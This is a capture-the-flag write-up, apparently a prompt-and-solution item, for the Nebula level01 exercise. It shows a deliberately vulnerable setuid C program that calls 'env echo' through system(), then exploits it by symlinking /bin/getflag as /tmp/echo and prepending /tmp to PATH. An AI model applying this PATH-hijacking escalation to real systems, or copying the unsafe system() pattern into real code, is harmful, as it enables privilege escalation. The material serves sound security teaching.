### Prompt
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

### Solution
When a command is executed the system looks recuresively inside the folders specified in the PATH until it finds a file a binary with the name of the command.

We want to create a symlink to ``/bin/getflag`` so that it will be executed instead of ``echo``.

```shell
level01@nebula:/home/flag01$ ln -s /bin/getflag /tmp/echo
level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
```
